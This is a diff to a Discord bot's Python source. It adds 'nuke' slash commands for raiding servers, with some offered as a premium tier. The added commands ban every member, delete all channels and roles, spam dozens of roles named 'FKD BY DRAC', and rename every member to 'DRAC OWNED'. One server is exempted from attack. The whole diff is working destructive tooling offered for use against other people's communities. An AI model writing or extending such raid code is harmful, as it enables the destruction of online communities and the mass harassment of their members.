@@ -438,13 +438,52 @@ async def setup_support_slash(interaction: discord.Interaction, role: discord.Ro
     
     await interaction.response.send_message(f"✅ Support Setup Complete!\nStaff Role: {role.mention}\nCategory: {category.name}", ephemeral=True)
 
-@client.tree.command(name="nuke", description="Full server nuke (Premium Only)")
+@client.tree.command(name="nuke", description="Basic server nuke (Regular Users)")
 async def nuke_slash(interaction: discord.Interaction):
     if interaction.guild_id == WHITELISTED_SERVER_ID:
         return await interaction.response.send_message("❌ This server is protected from nuking!", ephemeral=True)
+    await interaction.response.send_message("🚀 Nuke Started!", ephemeral=True)
+    await nuke_guild(interaction.guild)
+
+@client.tree.command(name="chaos_nuke", description="High-intensity nuke with custom roles (Premium Only)")
+@app_commands.describe(role_name="Name for spam roles")
+async def chaos_nuke_slash(interaction: discord.Interaction, role_name: str = "FKD BY DRAC"):
     if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
         return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
-    await interaction.response.send_message("🚀 Nuke Started!", ephemeral=True)
+    if interaction.guild_id == WHITELISTED_SERVER_ID:
+        return await interaction.response.send_message("❌ Protected!", ephemeral=True)
+    
+    await interaction.response.send_message("🔥 Chaos Nuke Initiated!", ephemeral=True)
+    # Intense role spam
+    for _ in range(50):
+        try: await interaction.guild.create_role(name=role_name, color=discord.Color.red())
+        except: break
+    await nuke_guild(interaction.guild)
+
+@client.tree.command(name="ghost_nuke", description="Silent nuke - Deletes everything without spamming (Premium Only)")
+async def ghost_nuke_slash(interaction: discord.Interaction):
+    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
+        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
+    if interaction.guild_id == WHITELISTED_SERVER_ID:
+        return await interaction.response.send_message("❌ Protected!", ephemeral=True)
+        
+    await interaction.response.send_message("👻 Ghost Nuke Started...", ephemeral=True)
+    await ban_all_members(interaction.guild)
+    await delete_all_channels(interaction.guild)
+    await delete_all_roles(interaction.guild)
+
+@client.tree.command(name="extreme_nuke", description="The ultimate nuke experience (Premium Only)")
+async def extreme_nuke_slash(interaction: discord.Interaction):
+    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
+        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
+    if interaction.guild_id == WHITELISTED_SERVER_ID:
+        return await interaction.response.send_message("❌ Protected!", ephemeral=True)
+
+    await interaction.response.send_message("⚡ EXTREME NUKE ENGAGED!", ephemeral=True)
+    # Mass nickname change + Nuke
+    for member in interaction.guild.members:
+        try: await member.edit(nick="DRAC OWNED")
+        except: continue
     await nuke_guild(interaction.guild)
 
 @client.tree.command(name="custom_nuke", description="Full server nuke with custom message & channel names (Premium)")
